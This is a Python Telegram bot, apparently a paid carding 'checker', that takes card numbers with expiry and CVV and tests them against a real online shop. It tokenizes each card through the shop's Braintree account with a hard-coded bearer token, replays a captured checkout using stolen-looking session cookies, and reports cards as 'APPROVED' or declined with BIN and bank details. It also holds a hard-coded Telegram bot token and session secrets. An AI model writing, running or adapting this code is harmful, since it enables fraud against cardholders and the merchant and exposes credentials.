import requests
from datetime import datetime
import telebot
import time
from user_agent import generate_user_agent

user_agent = generate_user_agent()


current_time = datetime.now()
expiry_time = datetime.strptime('''2024-10-19 00:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('[!] إنتهى اشتراكك تواصل مع المطور لتجديد الإشتراك @u_3_3_3_3')
    exit(0)
    
bot = telebot.TeleBot('6316757824:AAFPIt6nJN-lx2N6o8RUmwbIP-0wJjdrPYU')

authorized_user_ids = [1667594079, 1279901274, 5266567729, 1946934338, 6173592610]
authorized_chat_ids = [-1001914774158, -1001701395932, -1001973816710, -1001933244351]#, -1001933244351

last_auth_time = {}
auth_count = {}


@bot.message_handler(commands=['chk'])
def authorize_card(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id in authorized_user_ids or chat_id in authorized_chat_ids:
        if user_id not in auth_count:
            auth_count[user_id] = 0

        current_time = time.time()

        if current_time - last_auth_time.get(user_id, 0) < 50:
            wait_time = 50 - (current_time - last_auth_time[user_id])
            bot.reply_to(message, f"ANTI_SPAM: Try again after {int(wait_time)} seconds.")
            return

        auth_count[user_id] += 1
        last_auth_time[user_id] = current_time


    command = message.text
    if len(command.split('|')) != 4:
        bot.reply_to(message, "Invalid command format. Please use the format: /chk XXXXXXXXXXXXXXXX|Month|Year|CVV")
        return

    result = verify_card(message, command)
    bot.reply_to(message, result)


def verify_card(message, command):
    P = command.split(' ')[1]
    n = P.split('|')[0]
    mm = P.split('|')[1]
    yy = P.split('|')[2][-2:]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')

    auth_message = bot.send_message(message.chat.id, text='**Please Wait ...**', parse_mode='markdown', reply_to_message_id=message.message_id)
    time.sleep(5)
    start_time = time.time()
    
  
    headers_1 = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTc1NTMwMTIsImp0aSI6ImQ3YzJhNGViLWNlN2YtNDljYi05NGQ2LTY1NmIxOWYzZTU2ZiIsInN1YiI6ImR5ZzV3dnd4NXpkZ2dieWsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImR5ZzV3dnd4NXpkZ2dieWsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiTHlyZXNTcGlyaXRDb19pbnN0YW50In19.9phWUIwO2a77rR3KiSMU4B-N5_h3rn7nOKLZpq8JECH3NIGcRS5FYdRTODZoTXt3S3HvRmgS16sxNS4PwE8txw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    json_data_1 = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'a0d63c89-a727-4125-814d-0c7927e64ae5',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
    }

    response_1 = requests.post('https://payments.braintree-api.com/graphql', headers=headers_1, json=json_data_1)


    id = response_1.json()['data']['tokenizeCreditCard']['token']

    auth_message = bot.edit_message_text(chat_id=message.chat.id, message_id=auth_message.message_id, text='**Waiting for result...**', parse_mode='markdown')

    cookies_2 = {
    'SHOP_SESSION_TOKEN': 'e07dd317-9873-48dc-97ca-5d38a18924cb',
    'STORE_VISITOR': '1',
    'CookieConsent': '{stamp:%275EBwWBiBzdL0/JkZiPuHRBZBUm6YNkLLjnLzkFSA4QZHBjdZrTsZXQ==%27%2Cnecessary:true%2Cpreferences:false%2Cstatistics:false%2Cmarketing:false%2Cmethod:%27explicit%27%2Cver:2%2Cutc:1697452299254%2Cregion:%27ma%27}',
    'ssUserId': 'c0817714-f4b1-486a-814a-92c6f49dc176',
    '_isuid': 'c0817714-f4b1-486a-814a-92c6f49dc176',
    'fornax_anonymousId': '6089ec78-4069-4365-b321-f3ee6f7aaeaa',
    'optiMonkClientId': '339d4a8e-24bc-d2b4-bece-9738efa31f6d',
    'ajs_user_id': 'null',
    'ajs_group_id': 'null',
    'ajs_anonymous_id': '%226fa9f5de-42e0-4cca-90ea-4198cc695a3c%22',
    'recordID': '2e722ae6-78a8-45d9-8e8c-4a2bda282764',
    '_ga': 'GA1.2.951781357.1697452348',
    '_gid': 'GA1.2.661939969.1697452348',
    'smc_tag': 'eyJpZCI6MzEwNiwibmFtZSI6Imx5cmVzLmNvbSJ9',
    'smc_refresh': '24898',
    'smc_not': 'default',
    'smc_uid': '1697452262880414',
    '_shg_user_id': '73295ec7-48de-490a-b437-10ee504c88b6',
    '_hjSessionUser_3206410': 'eyJpZCI6ImVmZWUxM2EyLTllNjEtNTRkMy04YTZkLTU5MjFmNmIwN2YxNSIsImNyZWF0ZWQiOjE2OTc0NTIzMTIzNDgsImV4aXN0aW5nIjp0cnVlfQ==',
    'optiMonkEmbedded184040': 'N4IgFghgzgMglgWzgFwEoFMIGMzoCYgBcAZhADZToC+QA===',
    'SHOP_SESSION_ROTATION_TOKEN': '2f2f6b699b4f851b1e28c7329a0efc8f00c5bd9a33be43971ec5b3915a0ac667',
    '_fbp': 'fb.1.1697452430810.68838404',
    'popupCookie': 'lyresRegionSelected',
    'athena_short_visit_id': 'd3a54ee7-7c6a-4119-94e8-240732a99369:1697465760',
    'XSRF-TOKEN': '8f75c6a7821ad051618577b5b035b912657e6a18a8f2b48ec9a9525c3c54afb7',
    'dmSessionID': '1a979432-14e7-4e01-a667-6583e8373fc9',
    '_shg_session_id': 'cde2bd13-5913-4f67-b6f7-aa61861fc488',
    'optiMonkSession': '1697465847',
    'smc_session_id': '5lfDPM3GiPoVO17mbZC4sUFWd8zuUCwL',
    'smc_sesn': '2',
    'ssSessionIdNamespace': '5306060f-a2c8-4b47-b17f-6dc6acd0124b',
    '_sp_ses.7c51': '*',
    '_hjSession_3206410': 'eyJpZCI6Ijc2YTJkOGExLTM0ZTktNGE4OC05ODU4LWE0ZDJlZGUyOWJlNCIsImNyZWF0ZWQiOjE2OTc0NjYxNDI4MjMsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=',
    '_hjAbsoluteSessionInProgress': '1',
    'smc_tpv': '8',
    'smc_spv': '2',
    '_uetsid': '5c60a5406c0f11eebd600545031fb298',
    '_uetvid': '5c6a9b606c0f11ee9cada9708e5f2aca',
    '_hjIncludedInSessionSample_3206410': '1',
    'checkoutObj': '{%22total%22:71.98%2C%22names%22:[%22Dry%20Martini%20Set%22]}',
    '_gali': 'checkout-payment-continue',
    'purchaseTime': '%2216%20October%202023%2C%202:32:12%22',
    'smct_session': '%7B%22s%22%3A1697466095785%2C%22l%22%3A1697466733651%2C%22lt%22%3A1697466728967%2C%22t%22%3A39%2C%22p%22%3A152%7D',
    '_sp_id.7c51': 'e616838b35f7c24a.1697452308.2.1697466734.1697453836',
    'Shopper-Pref': 'F619C1E65F210FC3171D9B4EC1213C1F6906DF21-1698071530184-x%7B%22cur%22%3A%22USD%22%7D',
    }

    headers_2 = {
    'authority': 'lyres.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    # 'cookie': 'SHOP_SESSION_TOKEN=e07dd317-9873-48dc-97ca-5d38a18924cb; STORE_VISITOR=1; CookieConsent={stamp:%275EBwWBiBzdL0/JkZiPuHRBZBUm6YNkLLjnLzkFSA4QZHBjdZrTsZXQ==%27%2Cnecessary:true%2Cpreferences:false%2Cstatistics:false%2Cmarketing:false%2Cmethod:%27explicit%27%2Cver:2%2Cutc:1697452299254%2Cregion:%27ma%27}; ssUserId=c0817714-f4b1-486a-814a-92c6f49dc176; _isuid=c0817714-f4b1-486a-814a-92c6f49dc176; fornax_anonymousId=6089ec78-4069-4365-b321-f3ee6f7aaeaa; optiMonkClientId=339d4a8e-24bc-d2b4-bece-9738efa31f6d; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%226fa9f5de-42e0-4cca-90ea-4198cc695a3c%22; recordID=2e722ae6-78a8-45d9-8e8c-4a2bda282764; _ga=GA1.2.951781357.1697452348; _gid=GA1.2.661939969.1697452348; smc_tag=eyJpZCI6MzEwNiwibmFtZSI6Imx5cmVzLmNvbSJ9; smc_refresh=24898; smc_not=default; smc_uid=1697452262880414; _shg_user_id=73295ec7-48de-490a-b437-10ee504c88b6; _hjSessionUser_3206410=eyJpZCI6ImVmZWUxM2EyLTllNjEtNTRkMy04YTZkLTU5MjFmNmIwN2YxNSIsImNyZWF0ZWQiOjE2OTc0NTIzMTIzNDgsImV4aXN0aW5nIjp0cnVlfQ==; optiMonkEmbedded184040=N4IgFghgzgMglgWzgFwEoFMIGMzoCYgBcAZhADZToC+QA===; SHOP_SESSION_ROTATION_TOKEN=2f2f6b699b4f851b1e28c7329a0efc8f00c5bd9a33be43971ec5b3915a0ac667; _fbp=fb.1.1697452430810.68838404; popupCookie=lyresRegionSelected; athena_short_visit_id=d3a54ee7-7c6a-4119-94e8-240732a99369:1697465760; XSRF-TOKEN=8f75c6a7821ad051618577b5b035b912657e6a18a8f2b48ec9a9525c3c54afb7; dmSessionID=1a979432-14e7-4e01-a667-6583e8373fc9; _shg_session_id=cde2bd13-5913-4f67-b6f7-aa61861fc488; optiMonkSession=1697465847; smc_session_id=5lfDPM3GiPoVO17mbZC4sUFWd8zuUCwL; smc_sesn=2; ssSessionIdNamespace=5306060f-a2c8-4b47-b17f-6dc6acd0124b; _sp_ses.7c51=*; _hjSession_3206410=eyJpZCI6Ijc2YTJkOGExLTM0ZTktNGE4OC05ODU4LWE0ZDJlZGUyOWJlNCIsImNyZWF0ZWQiOjE2OTc0NjYxNDI4MjMsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=; _hjAbsoluteSessionInProgress=1; smc_tpv=8; smc_spv=2; _uetsid=5c60a5406c0f11eebd600545031fb298; _uetvid=5c6a9b606c0f11ee9cada9708e5f2aca; _hjIncludedInSessionSample_3206410=1; checkoutObj={%22total%22:71.98%2C%22names%22:[%22Dry%20Martini%20Set%22]}; _gali=checkout-payment-continue; purchaseTime=%2216%20October%202023%2C%202:32:12%22; smct_session=%7B%22s%22%3A1697466095785%2C%22l%22%3A1697466733651%2C%22lt%22%3A1697466728967%2C%22t%22%3A39%2C%22p%22%3A152%7D; _sp_id.7c51=e616838b35f7c24a.1697452308.2.1697466734.1697453836; Shopper-Pref=F619C1E65F210FC3171D9B4EC1213C1F6906DF21-1698071530184-x%7B%22cur%22%3A%22USD%22%7D',
    'origin': 'https://lyres.com',
    'referer': 'https://lyres.com/checkout',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-checkout-sdk-version': '1.464.0',
    'x-checkout-variant': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2x5cmVzLmNvbSIsImlhdCI6MTY5NzQ2NjU0NiwiZG9tYWluIjp7ImNhcnRJZCI6IjE1MjJmMTQ5LWM3N2EtNDQ5Mi05NzA1LWUxNmVhNmU4YzBmOCIsImNoZWNrb3V0VmFyaWFudCI6Im9wdGltaXplZF9vbmVfcGFnZV9jaGVja291dCJ9fQ.4UrGetun05yKE4De5uC1JNGzlV-ivD9m5emvamSiJEY',
    'x-xsrf-token': '8f75c6a7821ad051618577b5b035b912657e6a18a8f2b48ec9a9525c3c54afb7',
    }

    json_data_2 = {
    'cartId': '1522f149-c77a-4492-9705-e16ea6e8c0f8',
    'customerMessage': '',
    }

    response_2 = requests.post('https://lyres.com/internalapi/v1/checkout/order', cookies=cookies_2, headers=headers_2, json=json_data_2)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"cartId":"1522f149-c77a-4492-9705-e16ea6e8c0f8","customerMessage":""}'
#response = requests.post('https://lyres.com/internalapi/v1/checkout/order', cookies=cookies, headers=headers, data=data)


    time.sleep(4)

    api = requests.get(f'https://lookup.binlist.net/{n[:6]}').json()
    try:
        chh = api['scheme']
        ch = chh.upper()
    except:
        ch = 'False'
    try:
        typ = api['type']
        type = typ.upper()
    except:
        type = 'False'
    try:
        raa = api['brand']
        ra = raa.upper()
    except:
        ra = 'False'
    try:
        am = api['bank']['name']
        ame = am.upper()
    except:
        ame = 'False'
    try:
        co = api['country']['name']
        cou = co
    except:
        cou = 'False'
    try:
        emoji = api['country']['emoji']
    except:
        emoji = 'False'
        
    end_time = time.time()
    elapsed_time = round(end_time - start_time, 2)

    bot.delete_message(chat_id=message.chat.id, message_id=auth_message.message_id)

    if response_2.status_code == 200:
        data = response_2.json()
        #message = data["resultSub"]["message"]
        #status = data["resultSub"]["transaction"]["status"]
        status = data["status"]

        if "Insufficient Funds" in data or "success" in data or "Funds" in data:
            return f'''𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫✅ 𖣗✅\n
ϟ 𝑪𝑨𝑹𝑫 -» {P}
ϟ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 -» Braintree Auth3
ϟ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 𖠡 -» {status}
ϟ 𝑺𝑻𝑨𝑻𝑼𝑺 -»  Approved! ♻️
ϟ 𝑹𝑬𝑺𝑼𝑳𝑻 -» 𝑪𝑯𝑨𝑹𝑮𝑬 0.01$
————𝑩𝑨𝑵𝑲 𝑫𝑬𝑻𝑨𝑰𝑳𝑺————               
ϟ 𝑩𝑰𝑵 -» {n[:6]}
ϟ 𝑩𝑰𝑵 𝑰𝑵𝑭𝑶  -» {ch} - {type} - {ra}
ϟ 𝑩𝑨𝑵𝑲 -» {ame}
ϟ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 -» {cou} {emoji}
————𝑶𝑻𝑯𝑬𝑹 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 ࿋————
ϟ 𝑻𝑹𝑰𝑬𝑺 𖢊 -» 1
ϟ 𝑷𝑹𝑶𝑿𝒀 -» 𝑳𝑰𝑽𝑬 [ 413.02.4.. ✅ ] 
ϟ 𝑫𝑬𝑽  -» 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ .
ϟ 𝑻𝑨𝑲𝑬𝑵 𖣬 {elapsed_time} seconds .
'''

        
            print(f'''𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫✅\n
ϟ 𝑪𝑨𝑹𝑫 -» {P}
ϟ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 -» Braintree Auth3
ϟ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 𖠡 -» {status}
ϟ 𝑺𝑻𝑨𝑻𝑼𝑺 -»  𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫! ♻️
ϟ 𝑹𝑬𝑺𝑼𝑳𝑻 -» 𝑪𝑯𝑨𝑹𝑮𝑬 0.01$
————𝑩𝑨𝑵𝑲 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 ————                
ϟ 𝑩𝑰𝑵 -» {n[:6]}
ϟ 𝑩𝑰𝑵 𝑰𝑵𝑭𝑶 -» {ch} - {type} - {ra}
ϟ 𝑩𝑨𝑵𝑲 -» {ame}
ϟ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 -» {cou} {emoji}
————𝑶𝑻𝑯𝑬𝑹 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 ࿋————
ϟ 𝑻𝑹𝑰𝑬𝑺 𖢊 -» 1
ϟ 𝑷𝑹𝑶𝑿𝒀 -» 𝑳𝑰𝑽𝑬! [ 413.02.4.. ✅ ] 
ϟ 𝑫𝑬𝑽  -» 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ .
ϟ 𝑻𝑨𝑲𝑬𝑵 𖣬 {elapsed_time} seconds .
''')


        elif "Gateway Rejected: risk_threshold" in data:
            return f'''- - - - - - - - - - - - - - - - - - - - - - -
RISK: Retry this BIN later.
- - - - - - - - - - - - - - - - - - - - - - -
'''

             
        
        else:
            return f'''𝑫𝑬𝑪𝑳𝑰𝑵𝑫 ❌
- - - - - - - - - - - - - - - - - - - - - - -
ϟ 𝑪𝑨𝑹𝑫 -» {P}
ϟ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 -> Braintree Auth3
ϟ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 𖠡 -» {status}
ϟ 𝑺𝑻𝑨𝑻𝑼𝑺 -» 201:Declined
ϟ 𝑹𝑬𝑺𝑼𝑳𝑻 -» Not Charged
————𝑩𝑨𝑵𝑲 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 𖢐————                
ϟ 𝑩𝑰𝑵 -» {n[:6]}
ϟ 𝑩𝑰𝑵 𝑰𝑵𝑭𝑶  -» {ch} - {type} - {ra}
ϟ 𝑩𝑨𝑵𝑲 -» {ame}
ϟ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 -» {cou} {emoji}
————𝑶𝑻𝑯𝑬𝑹 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 ࿋————
ϟ 𝑻𝑹𝑰𝑬𝑺 𖢊 -» 1
ϟ 𝑷𝑹𝑶𝑿𝒀 -»𝑳𝑰𝑽𝑬! [ 413.02.49.. ✅ ] 
ϟ 𝑫𝑬𝑽  -» 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ .
ϟ 𝑻𝑨𝑲𝑬𝑵 𖣬 {elapsed_time} seconds .
'''





        
    else:
        return f'''𝑫𝑬𝑪𝑳𝑰𝑵𝑫 ❌
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {P}
𝑮𝑨𝑻𝑬𝑾𝑨𝒀 -> Braintree Charge
𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 𖠡 -> UNKNOW ReSpOnSe !
Message  -> UNKNOW Error .
- - - - - - - - - - - - - - - - - - - - - - -
𝑩𝑰𝑵 -> {n[:6]}
𝑩𝑰𝑵 𝑰𝑵𝑭𝑶  -> {ch} - {type} - {ra}
𝑩𝑨𝑵𝑲 -> {ame}
𝑪𝑶𝑼𝑵𝑻𝑹𝒀 -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
ϟ 𝑫𝑬𝑽  -» 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ .
𝑻𝑨𝑲𝑬𝑵 𖣬 {elapsed_time} seconds .
'''


bot.polling()
